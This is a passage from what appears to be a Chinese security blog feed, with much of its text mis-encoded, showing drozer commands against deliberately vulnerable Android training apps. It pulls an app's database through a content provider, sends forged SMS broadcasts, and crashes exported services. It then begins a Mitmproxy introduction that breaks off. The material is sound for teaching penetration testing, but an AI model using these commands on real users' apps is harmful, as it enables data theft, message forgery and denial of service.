(C:\Users\oooo\Desktop\database.dbä¸ºæ–‡ä»¶ä¿å­˜è·¯å¾„)</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db C:\\Users\\oooo\\Desktop\\database.db</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228161024128.png" data-caption="image-20221228161024128"><img src="/../images/app/Components/image-20221228161024128.png" alt="image-20221228161024128"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228161043428.png" data-caption="image-20221228161043428"><img src="/../images/app/Components/image-20221228161043428.png" alt="image-20221228161043428"></a></p><br/><h3 id="Broadcast-Receiver"><a href="#Broadcast-Receiver" class="headerlink" title="Broadcast Receiver"></a>Broadcast Receiver</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">| æ¼æ´ç§ç±»     | å±å®³                                                         |</span><br><span class="line">| ------------ | ------------------------------------------------------------ |</span><br><span class="line">| æ•æ„Ÿä¿¡æ¯æ³„éœ² | å‘é€çš„intentæ²¡æœ‰æ˜ç¡®æŒ‡å®šæ¥æ”¶è€…ï¼Œè€Œæ˜¯ç®€å•çš„é€šè¿‡actionè¿›è¡ŒåŒ¹é…ï¼Œæ¶æ„åº”ç”¨ä¾¿å¯ä»¥æ³¨å†Œä¸€ä¸ªå¹¿æ’­æ¥æ”¶è€…å—…æ¢æ‹¦æˆªåˆ°è¿™ä¸ªå¹¿æ’­ï¼Œå¦‚æœè¿™ä¸ªå¹¿æ’­å­˜åœ¨æ•æ„Ÿæ•°æ®ï¼Œå°±è¢«æ¶æ„åº”ç”¨çªƒå–äº†ã€‚ |</span><br><span class="line">| æƒé™ç»•è¿‡     | å¯ä»¥é€šè¿‡ä¸¤ç§æ–¹å¼æ³¨å†Œå¹¿æ’­æ¥æ”¶å™¨ï¼Œä¸€ç§æ˜¯åœ¨AndroidManifest.xmlæ–‡ä»¶ä¸­é€šè¿‡&lt;receiver&gt;æ ‡ç­¾é™æ€æ³¨å†Œï¼Œå¦ä¸€ç§æ˜¯é€šè¿‡Context.registerReceiver()åŠ¨æ€æ³¨å†Œï¼ŒæŒ‡å®šç›¸åº”çš„intentFilterå‚æ•°ï¼ŒåŠ¨æ€æ³¨å†Œçš„å¹¿æ’­é»˜è®¤éƒ½æ˜¯å¯¼å‡ºçš„ï¼Œå¦‚æœå¯¼å‡ºçš„BroadcastReceiveræ²¡æœ‰åšæƒé™æ§åˆ¶ï¼Œå¯¼è‡´BroadcastReceiverç»„ä»¶å¯ä»¥æ¥æ”¶ä¸€ä¸ªå¤–éƒ¨å¯æ§çš„urlã€æˆ–è€…å…¶ä»–å‘½ä»¤ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥è¶Šæƒåˆ©ç”¨åº”ç”¨çš„ä¸€äº›ç‰¹å®šåŠŸèƒ½ï¼Œæ¯”å¦‚å‘é€æ¶æ„å¹¿æ’­ã€ä¼ªé€ æ¶ˆæ¯ã€ä»»æ„åº”ç”¨ä¸‹è½½å®‰è£…ã€æ‰“å¼€é’“é±¼ç½‘ç«™ç­‰ |</span><br><span class="line">| æ¶ˆæ¯ä¼ªé€      | æš´éœ²çš„Receiverå¯¹å¤–æ¥æ”¶Intentï¼Œå¦‚æœæ„é€ æ¶æ„çš„æ¶ˆæ¯æ”¾åœ¨Intentä¸­ä¼ è¾“ï¼Œè¢«è°ƒç”¨çš„Receiveræ¥æ”¶å¯èƒ½äº§ç”Ÿå®‰å…¨éšæ‚£ |</span><br><span class="line">| æ‹’ç»æœåŠ¡     | å¦‚æœæ•æ„Ÿçš„BroadcastReceiveræ²¡æœ‰è®¾ç½®ç›¸åº”çš„æƒé™ä¿æŠ¤ï¼Œå¾ˆå®¹æ˜“å—åˆ°æ”»å‡»ã€‚æœ€å¸¸è§çš„æ˜¯æ‹’ç»æœåŠ¡æ”»å‡»ã€‚æ‹’ç»æœåŠ¡æ”»å‡»æŒ‡çš„æ˜¯ï¼Œä¼ é€’æ¶æ„ç•¸å½¢çš„intentæ•°æ®ç»™å¹¿æ’­æ¥æ”¶å™¨ï¼Œå¹¿æ’­æ¥æ”¶å™¨æ— æ³•å¤„ç†å¼‚å¸¸å¯¼è‡´crashã€‚ æ‹’ç»æœåŠ¡æ”»å‡»çš„å±å®³è§†å…·ä½“ä¸šåŠ¡åœºæ™¯è€Œå®šï¼Œæ¯”å¦‚ä¸€ä¸ªå®‰å…¨é˜²æŠ¤äº§å“çš„æ‹’ç»æœåŠ¡ã€é”å±åº”ç”¨çš„æ‹’ç»æœåŠ¡ã€æ”¯ä»˜è¿›ç¨‹çš„æ‹’ç»æœåŠ¡ç­‰å±å®³å°±æ˜¯å·¨å¤§çš„ã€‚ |</span><br></pre></td></tr></table></figure></div><br/><h4 id="æ‹’ç»æœåŠ¡"><a href="#æ‹’ç»æœåŠ¡" class="headerlink" title="æ‹’ç»æœåŠ¡"></a><font color=#ffffff>æ‹’ç»æœåŠ¡</font></h4><p>1ã€æŸ¥çœ‹é’ˆå¯¹ broadcast æ•°æ®ç»„ä»¶å…·ä½“çš„æ”»å‡»é¢</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.broadcast.info -a org.owasp.goatdroid.fourgoats</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20231122111055505.png" data-caption="image-20231122111055505"><img src="/../images/app/Components/image-20231122111055505.png" alt="image-20231122111055505"></a></p><p>2ã€é’ˆå¯¹ broadcast æ”»å‡»é¢è¿›è¡Œæµ‹è¯•éœ€è¦å…ˆæ‰¾åˆ°ç›¸åº”çš„ action åï¼Œç”±ä¸Šå›¾å¯çŸ¥ï¼Œbroadcast ç»„ä»¶åç§°ä¸º org.owasp.goatdroid.fourgoats.broadcastreceivers.SendSMSNowReceiver è¿™è¾¹ä½¿ç”¨ jadx è¿›è¡Œåç¼–è¯‘ï¼ŒæŸ¥çœ‹ AndroidManifest.xml å¯»æ‰¾ actionï¼Œå…³é”®æœç´¢ .broadcastreceivers.SendSMSNowReceiver</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228164227532.png" data-caption=""><img src="/../images/app/Components/image-20221228164227532.png" alt=""></a></p><p>æœªæ‰§è¡Œå‰</p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228164826268.png" data-caption="image-20221228164826268"><img src="/../images/app/Components/image-20221228164826268.png" alt="image-20221228164826268"></a></p><p>æ‰§è¡Œåï¼Œç¨‹åºé€€å‡ºï¼Œå¯¼è‡´æ‹’ç»æœåŠ¡</p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228164917550.png" data-caption="image-20221228164917550"><img src="/../images/app/Components/image-20221228164917550.png" alt="image-20221228164917550"></a></p><br/><h4 id="æ¶ˆæ¯ä¼ªé€ ï¼ˆå‘é€æ¶æ„å¹¿æ’­ï¼‰"><a href="#æ¶ˆæ¯ä¼ªé€ ï¼ˆå‘é€æ¶æ„å¹¿æ’­ï¼‰" class="headerlink" title="æ¶ˆæ¯ä¼ªé€ ï¼ˆå‘é€æ¶æ„å¹¿æ’­ï¼‰"></a><font color=#ffffff>æ¶ˆæ¯ä¼ªé€ ï¼ˆå‘é€æ¶æ„å¹¿æ’­ï¼‰</font></h4><p>1ã€æŸ¥çœ‹é’ˆå¯¹ broadcast æ•°æ®ç»„ä»¶å…·ä½“çš„æ”»å‡»é¢</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.broacast.info -a org.owasp.goatdroid.fourgoats</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20231122111055505.png" data-caption="image-20231122111055505"><img src="/../images/app/Components/image-20231122111055505.png" alt="image-20231122111055505"></a></p><p>2ã€åˆ©ç”¨ jadx åç¼–è¯‘ apkï¼ŒæŸ¥çœ‹ broadcast receivers æ¨¡å—å…·ä½“ä»£ç ï¼Œå®¡è®¡ .broadcastreceivers.SendSMSNowReceiver ä»£ç å¯çŸ¥å‘é€å¹¿æ’­éœ€è¦ä¸¤ä¸ªå‚æ•°å‘½ä»¤</p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228163829810.png" data-caption="image-20221228163829810"><img src="/../images/app/Components/image-20221228163829810.png" alt="image-20221228163829810"></a></p><p>action åç§°ä¸º org.owasp.goatdroid.fourgoats.SOCIAL_SMS</p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228164227532.png" data-caption="image-20221228164227532"><img src="/../images/app/Components/image-20221228164227532.png" alt="image-20221228164227532"></a></p><p>å…·ä½“æ‰§è¡Œä»£ç ä¸º</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --extra string phoneNumber 13800000000 --extra string message test</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228164509817.png" data-caption="image-20221228164509817"><img src="/../images/app/Components/image-20221228164509817.png" alt="image-20221228164509817"></a></p><br/><h3 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h3><p>å‚è€ƒæ–‡ç« ï¼šService(æœåŠ¡)æ˜¯ä¸€ä¸ªä¸€ç§å¯ä»¥åœ¨åå°æ‰§è¡Œé•¿æ—¶é—´è¿è¡Œæ“ä½œè€Œæ²¡æœ‰ç”¨æˆ·ç•Œé¢çš„åº”ç”¨ç»„ä»¶ã€‚æœåŠ¡å¯ç”±å…¶ä»–åº”ç”¨ç»„ä»¶å¯åŠ¨ï¼ˆå¦‚Activityï¼‰ï¼ŒæœåŠ¡ä¸€æ—¦è¢«å¯åŠ¨å°†åœ¨åå°ä¸€ç›´è¿è¡Œï¼Œå³ä½¿å¯åŠ¨æœåŠ¡çš„ç»„ä»¶ï¼ˆActivityï¼‰å·²é”€æ¯ä¹Ÿä¸å—å½±å“ã€‚ æ­¤å¤–ï¼Œç»„ä»¶å¯ä»¥ç»‘å®šåˆ°æœåŠ¡ï¼Œä»¥ä¸ä¹‹è¿›è¡Œäº¤äº’ï¼Œç”šè‡³æ˜¯æ‰§è¡Œè¿›ç¨‹é—´é€šä¿¡ (IPC)ã€‚</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">| æ¼æ´ç§ç±»    | å±å®³                                                         |</span><br><span class="line">| ----------- | ------------------------------------------------------------ |</span><br><span class="line">| æƒé™æå‡    | å½“ä¸€ä¸ªserviceé…ç½®äº†intent``-``filteré»˜è®¤æ˜¯è¢«å¯¼å‡ºçš„ï¼Œå¦‚æœæ²¡å¯¹è°ƒç”¨Serviceè¿›è¡Œæƒé™ï¼Œé™åˆ¶æˆ–è€…æ˜¯æ²¡æœ‰å¯¹è°ƒç”¨è€…çš„èº«ä»½è¿›è¡Œæœ‰æ•ˆéªŒè¯ï¼Œé‚£ä¹ˆæ¶æ„æ„é€ çš„APPéƒ½å¯ä»¥å¯¹æ­¤Serviceä¼ å…¥æ°å½“çš„å‚æ•°è¿›è¡Œè°ƒç”¨ï¼Œå¯¼è‡´æ¶æ„è¡Œä¸ºå‘ç”Ÿæ¯”å¦‚è°ƒç”¨å…·æœ‰systemæƒé™çš„åˆ é™¤å¸è½½æœåŠ¡åˆ é™¤å¸è½½å…¶ä»–åº”ç”¨ã€‚ |</span><br><span class="line">| serviceåŠ«æŒ | éšå¼å¯åŠ¨services,å½“å­˜åœ¨åŒåservices,å…ˆå®‰è£…åº”ç”¨çš„servicesä¼˜å…ˆçº§é«˜ |</span><br><span class="line">| æ¶ˆæ¯ä¼ªé€     | æš´éœ²çš„Serviceå¯¹å¤–æ¥æ”¶Intentï¼Œå¦‚æœæ„é€ æ¶æ„çš„æ¶ˆæ¯æ”¾åœ¨Intentä¸­ä¼ è¾“ï¼Œè¢«è°ƒç”¨çš„Serviceæ¥æ”¶å¯èƒ½äº§ç”Ÿå®‰å…¨éšæ‚£ |</span><br><span class="line">| æ‹’ç»æœåŠ¡    | Serviceçš„æ‹’ç»æœåŠ¡ä¸»è¦æ¥æºäºServiceå¯åŠ¨æ—¶å¯¹æ¥æ”¶çš„Intentç­‰æ²¡æœ‰åšå¼‚å¸¸æƒ…å†µä¸‹çš„å¤„ç†ï¼Œå¯¼è‡´ç¨‹åºå´©æºƒ |</span><br></pre></td></tr></table></figure></div><br/><h4 id="æ‹’ç»æœåŠ¡-1"><a href="#æ‹’ç»æœåŠ¡-1" class="headerlink" title="æ‹’ç»æœåŠ¡"></a><font color=#ffffff>æ‹’ç»æœåŠ¡</font></h4><p>1ã€æŸ¥çœ‹é’ˆå¯¹ service ç»„ä»¶å…·ä½“çš„æ”»å‡»é¢</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.service.info -a org.owasp.goatdroid.fourgoats</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228162300918.png" data-caption="image-20221228162300918"><img src="/../images/app/Components/image-20221228162300918.png" alt="image-20221228162300918"></a></p><p>æ‰“å¼€ FourGoats app åœç•™åœ¨é¦–é¡µç•Œé¢ï¼Œç”±äºå­˜æ¼æ´ï¼Œç›´æ¥è°ƒç”¨å¯¼è‡´æ‹’ç»æœåŠ¡ï¼ŒAPPç¨‹åºè‡ªåŠ¨é€€å‡ºï¼Œè¿”å›æ¡Œé¢</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.service.start --action org.owasp.goatdroid.fourgoats.services.LocationService</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228162847713.png" data-caption="image-20221228162847713"><img src="/../images/app/Components/image-20221228162847713.png" alt="image-20221228162847713"></a></p><p>æ›´å¤šå…·ä½“ä¾‹å­è¯·å‚è€ƒæ–‡ç« ï¼š<a href="https://bbs.pediy.com/thread-269255.htm">https://bbs.pediy.com/thread-269255.htm</a></p><hr><h2 id="å››ã€æ‰©å±•çŸ¥è¯†ç‚¹"><a href="#å››ã€æ‰©å±•çŸ¥è¯†ç‚¹" class="headerlink" title="å››ã€æ‰©å±•çŸ¥è¯†ç‚¹"></a>å››ã€æ‰©å±•çŸ¥è¯†ç‚¹</h2><h3 id="adbä½¿ç”¨"><a href="#adbä½¿ç”¨" class="headerlink" title="adbä½¿ç”¨"></a>adbä½¿ç”¨</h3><p>adbæŸ¥çœ‹è¿æ¥è®¾å¤‡çš„androidæ—¥å¿—</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">//æ ¼å¼1ï¼šæ‰“å°é»˜è®¤æ—¥å¿—æ•°æ®</span><br><span class="line">adb logcat </span><br><span class="line"></span><br><span class="line">//æ ¼å¼2ï¼šéœ€è¦æ‰“å°æ—¥å¿—è¯¦ç»†æ—¶é—´çš„ç®€å•æ•°æ®</span><br><span class="line">adb logcat -v time</span><br><span class="line"></span><br><span class="line">//æ ¼å¼3ï¼šéœ€è¦æ‰“å°çº§åˆ«ä¸ºErrorçš„ä¿¡æ¯</span><br><span class="line">adb logcat *:E</span><br><span class="line"></span><br><span class="line">//æ ¼å¼4ï¼šéœ€è¦æ‰“å°æ—¶é—´å’Œçº§åˆ«æ˜¯Errorçš„ä¿¡æ¯</span><br><span class="line">adb logcat -v time *:E</span><br><span class="line"></span><br><span class="line">//æ ¼å¼5ï¼šå°†æ—¥å¿—ä¿å­˜åˆ°ç”µè„‘å›ºå®šçš„ä½ç½®ï¼Œæ¯”å¦‚D:\log.txt</span><br><span class="line">adb logcat -v time &gt;D:\log.txt</span><br><span class="line"></span><br><span class="line">//æ ¼å¼5ï¼šæ—¥å¿—ç›‘å¬</span><br><span class="line">adb logcat |grep packagename(appåŒ…å)</span><br></pre></td></tr></table></figure></div><br/><h3 id="APPæ¨¡å—è¯´æ˜"><a href="#APPæ¨¡å—è¯´æ˜" class="headerlink" title="APPæ¨¡å—è¯´æ˜"></a>APPæ¨¡å—è¯´æ˜</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">| æ¨¡å—å                    | ä½œç”¨                                                        |</span><br><span class="line">| ------------------------- | ----------------------------------------------------------- |</span><br><span class="line">| app.activity.forintent    | é€šè¿‡intentæŸ¥æ‰¾å®ƒçš„activity                                  |</span><br><span class="line">| app.activity.info         | è·å–activitiesä¿¡æ¯                                          |</span><br><span class="line">| app.activity.start        | å¼€å¯ Activity                                               |</span><br><span class="line">| app.broadcast.info        | è·å–broadcast receiversä¿¡æ¯                                 |</span><br><span class="line">| app.broadcast.send        | å‘é€å¹¿æ’­                                                    |</span><br><span class="line">| app.broadcast.sniff       | å—…æ¢å¹¿æ’­ä¸­intentçš„æ•°æ®                                      |</span><br><span class="line">| app.package.attacksurface | ç¡®å®šå®‰è£…åŒ…çš„å¯æ”»å‡»é¢                                        |</span><br><span class="line">| app.package.backup        | åˆ—å‡ºå¯å¤‡ä»½çš„åŒ…                                              |</span><br><span class="line">| app.package.debuggable    | åˆ—å‡ºå¯debugçš„åŒ…                                             |</span><br><span class="line">| app.package.info          | è·å–å·²å®‰è£…åŒ…çš„ä¿¡æ¯                                          |</span><br><span class="line">| app.package.launchintent  | è·å–ç¨‹åºå¯åŠ¨çš„activityä¿¡æ¯                                  |</span><br><span class="line">| app.package.list          | æ‰‹æœºå·²å®‰è£…çš„ç¨‹åºåŒ…                                          |</span><br><span class="line">| app.package.manifest      | è·å–ç¨‹åºmanifestæ–‡ä»¶ä¿¡æ¯                                    |</span><br><span class="line">| app.package.native        | åˆ—å‡ºNative libraries ä¿¡æ¯                                   |</span><br><span class="line">| app.package.shareduid     | æŸ¥æ‰¾æ‹¥æœ‰å…±åŒuidçš„åŒ…å’Œä»–ä»¬æ‰€æœ‰çš„æƒé™                         |</span><br><span class="line">| app.provider.columns      | å±•ç¤ºcontent provider URIçš„å„åˆ—                              |</span><br><span class="line">| app.provider.delete       | åˆ é™¤content provider URIçš„å†…å®¹                              |</span><br><span class="line">| app.provider.download     | ä½¿ç”¨openInputStreamè¯»å–æŒ‡å®šuriçš„å†…å®¹ï¼Œå¹¶ä¸‹è½½åœ¨ç”µè„‘ä¸­        |</span><br><span class="line">| app.provider.info         | è·å– content providersä¿¡æ¯                                  |</span><br><span class="line">| app.provider.insert       | æ’å…¥æ•°æ®åˆ°content provider                                  |</span><br><span class="line">| app.provider.query        | æŸ¥è¯¢content provider å†…å®¹                                   |</span><br><span class="line">| app.provider.read         | ä½¿ç”¨openInputStreamè¯»å–æŒ‡å®šuriçš„å†…å®¹                        |</span><br><span class="line">| app.provider.update       | æ›´æ–°content providerçš„å†…å®¹                                  |</span><br><span class="line">| app.service.info          | è·å–servicesçš„ä¿¡æ¯                                          |</span><br><span class="line">| app.service.send          | ä½¿ç”¨ Messageæ”»å‡»æš´éœ²çš„serviceï¼Œå…¶serviceå®ç°äº†handleMessage |</span><br><span class="line">| app.service.start         | å¼€å¯æœåŠ¡                                                    |</span><br><span class="line">| app.service.stop          | åœæ­¢æœåŠ¡                                                    |</span><br></pre></td></tr></table></figure></div><br/><h2 id="äº”ã€æ€»ç»“"><a href="#äº”ã€æ€»ç»“" class="headerlink" title="äº”ã€æ€»ç»“"></a>äº”ã€æ€»ç»“</h2><p>æ–‡ç« ç¼–å†™æ–­æ–­ç»­ç»­ï¼Œå†…å®¹å¤šä¸ºå‚è€ƒç½‘ä¸Šå¸ˆå‚…ä»¬çš„æ–‡ç« ï¼Œå±äºå‰äººæ ½æ ‘ï¼Œåäººä¹˜å‡‰äº†ï¼ŒçŸ¥è¯†ç‚¹ä¹Ÿæ˜¯å¥½å‡ å¹´å‰çš„çŸ¥è¯†ï¼Œä¸€ç³»åˆ—å­¦ä¹ ä¸‹æ¥ï¼Œæ‰©å±•äº† APP æµ‹è¯•æ”»å‡»çš„æ€è·¯ï¼Œæ€»ä½“ä¸Šæµ‹è¯•åŸºäº drozer å·¥å…·ä¸‹è¿›è¡Œæµ‹è¯•ï¼Œæ ¹æ®æ¯ä¸ªç»„ä»¶çš„ç‰¹æ€§è¿›è¡Œå•ç‚¹çªç ´ï¼Œæ”¶è·è¿˜æ˜¯æœ‰çš„ã€‚</p><h2 id="å…­ã€å‚è€ƒ"><a href="#å…­ã€å‚è€ƒ" class="headerlink" title="å…­ã€å‚è€ƒ"></a>å…­ã€å‚è€ƒ</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">https://blog.yorek.xyz/android/paid/zsxq/week17-android-components/</span><br><span class="line">https://bbs.pediy.com/thread-269211.htm</span><br><span class="line">https://bbs.pediy.com/thread-269255.htm</span><br><span class="line">https://bbs.pediy.com/thread-269309.htm</span><br><span class="line">https://bbs.pediy.com/thread-269447.htm</span><br><span class="line">https://www.cnblogs.com/wjrblogs/p/13953761.html</span><br><span class="line">https://dl.google.com/android/repository/platform-tools_r33.0.3-windows.zip</span><br><span class="line">https://bbs.pediy.com/thread-262208.htm</span><br><span class="line">https://www.cnblogs.com/zhaoyixiang/p/11236458.html</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> APPæµ‹è¯•ç³»åˆ— </category>
          
      </categories>
      
      
        <tags>
            
            <tag> APPæµ‹è¯• </tag>
            
            <tag> å››å¤§ç»„ä»¶ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å·¥å…·ä½¿ç”¨ç¯‡(ä¸€)-Mitmproxyä¸­é—´äººä»£ç†</title>
      <link href="/2022/12/11/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AF%87(%E4%B8%80)-Mitmproxy%E4%B8%AD%E9%97%B4%E4%BA%BA%E4%BB%A3%E7%90%86/"/>
      <url>/2022/12/11/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AF%87(%E4%B8%80)-Mitmproxy%E4%B8%AD%E9%97%B4%E4%BA%BA%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="ä¸€ã€å‰è¨€"><a href="#ä¸€ã€å‰è¨€" class="headerlink" title="ä¸€ã€å‰è¨€"></a>ä¸€ã€å‰è¨€</h2><p>åœ¨å­¦ä¹  Mitmproxy å‰é¦–å…ˆæˆ‘ä»¬å¾—å…ˆäº†è§£ä¸€ä¸‹ Mitmproxy çš„åŠŸèƒ½ä½œç”¨æ˜¯ä»€ä¹ˆï¼Œç„¶åæˆ‘ä»¬åˆ©ç”¨å®ƒèƒ½åœ¨å®é™…çš„æµ‹è¯•ä¸­èƒ½å¸®åŠ©æˆ‘ä»¬è§£å†³ä»€ä¹ˆé—®é¢˜ã€‚</p><br/><h3 id="Mitmproxy-ç®€ä»‹"><a href="#Mitmproxy-ç®€ä»‹" class="headerlink" title="Mitmproxy ç®€ä»‹"></a>Mitmproxy ç®€ä»‹</h3><p>Mitmproxy æ˜¯ä¸€æ¬¾å¼€æºçš„æŠ“åŒ…å·¥å…·ï¼Œæ”¯æŒSSLçš„ HTTP ä»£ç†ï¼Œå®ƒå¯ä»¥ç”¨äºè°ƒè¯• HTTP é€šä¿¡ï¼Œå‘èµ·ä¸­é—´äººæ”»å‡»ç­‰ï¼Œä¸åŒäº Fiddler ç­‰æŠ“åŒ…å·¥å…·ï¼ŒMitmproxy ä¸ä»…å¯ä»¥æˆªè·è¯·æ±‚ã€å¸®åŠ©å¼€å‘è€…æŸ¥çœ‹ã€åˆ†ææ•°æ®åŒ…ï¼Œä½¿ç”¨è€…è¿˜å¯ä»¥é€šè¿‡è‡ªå®šä¹‰çš„ Python è„šæœ¬è¿›è¡ŒäºŒæ¬¡å¼€å‘ï¼Œä»¥è¾¾åˆ°è‡ªå·±çš„ä½¿ç”¨éœ€æ±‚ã€‚</p><br/><h3 id="Mitmproxy-è§£å†³çš„é—®é¢˜"><a href="#Mitmproxy-è§£å†³çš„é—®é¢˜" class="headerlink" title="Mitmproxy è§£å†³çš„é—®é¢˜"></a>Mitmproxy è§£å†³çš„é—®é¢˜</h3><p>æœ‰æ—¶å€™ä½¿ç”¨ Burp è¿›è¡Œä»£ç†ï¼Œç”±äºå®‰å…¨è®¾å¤‡æˆ–è€…ä¸æ˜åŸå› å¯¼è‡´æ— æ³•æŠ“å–åˆ°æ•°æ®åŒ…ï¼Œè¿™æ—¶å€™å¯ä»¥å°è¯•ä½¿ç”¨ Mitmproxy è¿›è¡Œä¸­é—´äººä»£ç†ï¼Œå…ˆæŠŠæµé‡ä»£ç†åˆ° Mitmproxy å†ç”± Mitmproxy è½¬å‘åˆ° Burp ä¸Šã€‚åœ¨å·¥ä½œä¸Šæœ‰ä¸€æ¬¡åœ¨æµ‹è¯•ä¸€ä¸ªç«™ç‚¹æ—¶æ— æ³•é€šè¿‡ Burp è¿›è¡Œæµé‡æŠ“å–ï¼Œåæ¥é€šè¿‡å…¬å¸çš„ä¸€ä½ â€œæ–‡è‰ºé’å¹´â€ åŒäº‹è·æ‚‰æ˜¯å› ä¸ºè¯¥ç«™ç‚¹ä½¿ç”¨äº†å›½å¯†ç®—æ³•ï¼Œ<code>SM2çš„æŸä¸ªå¯†é’¥ç®—æ³•ä¸å…¼å®¹ JAVA SDK</code>,å¹¶ç»™å‡ºäº†è§£å†³æ–¹æ¡ˆï¼Œ<font color=#c3dbe8>Mitmproxy ä¸­é—´äººä»£ç†</font>ï¼Œè§£å†³äº†ä½¿ç”¨äº†å›½å¯†ç®—æ³•æ— æ³•é€šè¿‡ Burp æŠ“åŒ…çš„é—®é¢˜ã€‚ã€‚</p><h2 id="äºŒã€å®‰è£…"><a href="#äºŒã€å®‰è£…" class="headerlink" title="äºŒã€å®‰è£…"></a>äºŒã€å®‰è£…</h2><p>Mitmproxy å®˜æ–¹æä¾›äº†ä¸¤ç§å®‰è£…æ–¹å¼ï¼š</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å®˜æ–¹ç›´æ¥ä¸‹è½½å®‰è£…åŒ…ç›´æ¥ install å®‰è£…ï¼Œç½‘å€ https://mitmproxy.org/</span><br><span class="line">é€šè¿‡ Python å®‰è£…ã€‚æœ¬æ–‡é‡‡å–åè€…å®‰è£…æ–¹æ³•</span><br></pre></td></tr></table></figure></div><br/><p>é¦–å…ˆå®‰è£…å¥½ Python ç‰ˆæœ¬éœ€è¦ä¸ä½äº 3.6ï¼Œä¸”å®‰è£…äº†é™„å¸¦çš„åŒ…ç®¡ç†å·¥å…· 